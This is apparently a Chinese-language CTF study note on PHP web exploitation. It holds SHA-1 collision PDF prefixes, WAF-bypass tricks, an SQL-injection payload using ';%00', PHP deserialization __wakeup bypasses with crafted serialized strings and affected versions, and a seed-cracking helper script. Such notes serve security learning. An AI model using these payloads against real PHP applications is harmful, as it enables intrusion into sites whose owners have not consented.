%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
```
##### trick
`$_SERVER['QUERY_STRING']`不会进行URLDecode，而`$_GET[]`会，所以只要进行url编码即可绕过

单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器
```php
<?php
$abc='I love u'; 
echo $abc //结果是:I love u 
echo '$abc' //结果是:$abc 
echo "$abc" //结果是:I love u 

$a="${@phpinfo()}"; //可以解析出来
<?php $a="${@phpinfo()}";?> //@可以为空格，tab，/**/ ，回车，+，-，!，~,\等
```

**可变变量指的是：一个变量的变量名可以动态的设置和使用。一个可变变量获取了一个普通变量的值作为其变量名**
![](https://img-blog.csdnimg.cn/2020051913015532.png)
这里使用 \$$ 将通过变量a获取到的数据，注册成为一个新的变量(这里是变量hello)。然后会发现变量 \$$a 的输出数据和变量 $hello 的输出数据一致(如上图，输出为 world)
![](https://img-blog.csdnimg.cn/2020051919215158.png)

假如waf不允许num变量传递字母：
`http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话`
那么我们可以在num前加个空格：
`http://www.xxx.com/index.php? num = aaaa`
这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符

[利用PHP的字符串解析特性Bypass](https://www.freebuf.com/articles/web/213359.html)

对于传入的非法的`$_GET`数组参数名，PHP会将他们替换成 **下划线**
```python
32: (空格)
43:+
46:.
91:[
95:_
```
当我们使用HPP（HTTP参数污染%0a）传入多个相同参数给服务器时，PHP只会接收到后者的值。（这一特性和中间件有关系）

当中过滤了 # 、 - 号，那么我们就无法进行常规的注释，但是我们可以用 `;%00` 来进行注释
```c
http://localhost/CTF/?user=\&pwd=||1;%00
对应SQL语句为：
select user from users where user='\' and pwd='||1;'
等价于：
select user from users where user='xxxxxxxxxxx'||1#
```
参考：
[红日安全：PHP-Audit-Labs](https://github.com/hongriSec/PHP-Audit-Labs)

(1)仍是int，但是如果`((1).(2)) `（注意需要套一个括号否则出错）就会得到字符串“12”
![](https://img-blog.csdnimg.cn/20200704114651562.png)
之后再通过字符串截取即可得到单字符，PHP中可以使用大括号来完成，也是按照惯例，第一个字符编号是0，第二个是1，以此类推
![](https://img-blog.csdnimg.cn/20200704114822970.png)

#### php反序列化
**常见方法：**
```php
__construct()//创建对象时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__invoke() //当脚本尝试将对象调用为函数时触发
```
**比较重要的方法：**
__sleep()：
>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。

对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。

__wakeup():
>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。

__toString()
>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。

**绕过正则**
在对象前可以添加`+`可以绕过正则匹配 
php7用+号绕过时会报错无法反序列化，只有php5可以这样

使用大写S+16进制
```
O:4:"test":1:{s:4:"data";s:4:"bmth";}
O:4:"test":1:{s:4:"data";S:4:"\x62\x6d\x74\x68";}
```

**绕过wakeup**
这是一个常考的点
1.CVE-2016-7124
影响版本：PHP5 < 5.6.25， PHP7 < 7.0.10
绕过`__wakeup` 成员属性数目大于实际数目

升级利用(PHP7.4已修复):
[https://github.com/php/php-src/issues/8938](https://github.com/php/php-src/issues/8938)
在测试中发现在PHP7及以上版本仍然存在`__wakeup` bypass。当属性个数大于等于2147483647时，直接绕过Wakeup限制
也可以尝试改为负数

2.bad unserialize string makes `__wakeup` ineffective
[https://bugs.php.net/bug.php?id=81153](https://bugs.php.net/bug.php?id=81153)
```php
<?php
class D{
	public $flag=True;
	public function __get($a){
		if($this->flag){
			echo 'flag';
		}else{
			echo 'hint';
		}
	}
	public function __wakeup(){
		$this->flag = False;
	}
}

class C{
		public function __destruct(){
		echo $this->c->b;
	}
}

@unserialize('O:1:"C":1:{s:1:"c";O:1:"D":0:{};N;}');
```
绕过方法:
删除掉序列化数据的最后一个`}`或者在最后两个`}`中间加上`;`

```
Success:
7.0.15 - 7.0.33, 7.1.1 - 7.1.33, 7.2.0 - 7.2.34, 7.3.0 - 7.3.28, 7.4.0 - 7.4.16, 8.0.0 - 8.0.3

Fail:
5.0.0 - 5.0.5, 5.1.0 - 5.1.6, 5.2.0 - 5.2.17, 5.3.0 - 5.3.29, 5.4.0 - 5.4.45, 5.5.0 - 5.5.38, 5.6.0 - 5.6.40, 7.0.0 - 7.0.14, 7.1.0
```
3.use `C:` to bypass `__wakeup`
[https://bugs.php.net/bug.php?id=81151](https://bugs.php.net/bug.php?id=81151)
```php
<?php
class E  {
	public function __construct(){
	}
	public function __destruct(){
		echo "destruct";
	}
	public function __wakeup(){
		echo "wake up";
	}
}

var_dump(unserialize('C:1:"E":0:{}'));
```

4.deserialized string contains a variable name with the wrong string length
[https://github.com/php/php-src/issues/9618](https://github.com/php/php-src/issues/9618)

```php
<?php

class A
{
    public $info;
    public $end = "1";

    public function __destruct()
    {
        $this->info->func();
    }
}

class B
{
    public $a;

    public function __wakeup()
    {
        $this->a = "exit();";
        echo '__wakeup';
    }

    public function __call($method, $args)
    {
        eval('echo "aaaa";' . $this->a . 'echo "bbb";');
    }
}

unserialize($_POST['data']);
```
当反序列化的字符串中包含字符串长度错误的变量名时，反序列化会继续进行，但会在调用 `__wakeup` 之前调用 `__destruct()` 函数。这样你就可以绕过 `__wakeup()`
`data=O:1:"A":2:{s:4:"info";O:1:"B":1:{s:3:"end";N;}s:6:"a";s:1:"1";}`

影响版本：
- 7.4.x -7.4.30
- 8.0.x


可参考文章:
[A new way to bypass `__wakeup()` and build POP chain](https://paper.seebug.org/1905/)

**原生类：**

SLP类中存在能够进行文件处理和迭代的类：

类  | 描述
-------- | -------
DirectoryIterator 	|遍历目录
FilesystemIterator 	|遍历目录
GlobIterator 	|遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*
SplFileObject 	|读取文件，按行读取，多行需要遍历
finfo/finfo_open() 	|需要两个参数


参考：
[PHP 原生类在 CTF 中的利用 ](https://www.anquanke.com/post/id/238482)
[任意代码执行下的php原生类利用](https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/)

参考文章：
[浅谈php反序列化的参数类型](https://550532788.github.io/2020/08/26/浅谈php反序列化的参数类型/)
[从一道CTF练习题浅谈php原生文件操作类](https://www.anquanke.com/post/id/167140)
[利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)
[四个实例递进php反序列化漏洞理解 ](https://www.anquanke.com/post/id/159206?display=mobile&platform=android)
[Session反序列化利用和SoapClient+crlf组合拳进行SSRF ](https://www.anquanke.com/post/id/202025)
[PHP反序列化由浅入深](https://xz.aliyun.com/t/3674)
[从CTF中学习PHP反序列化的各种利用方式](https://xz.aliyun.com/t/7570#toc-2)
[反序列化之PHP原生类的利用](https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0)
[POP链学习](http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/)
#### php伪随机数
[https://www.openwall.com/php_mt_seed/](https://www.openwall.com/php_mt_seed/)
用脚本将伪随机数转换成php_mt_seed可以识别的数据：
```php
str1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
str2='' 
str3 = str1[::-1]
length = len(str2)
res=''
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
            break
print (res)
```
["钓鱼城杯"国际网络安全技能大赛Writeup](http://www.gem-love.com/ctf/2612.html)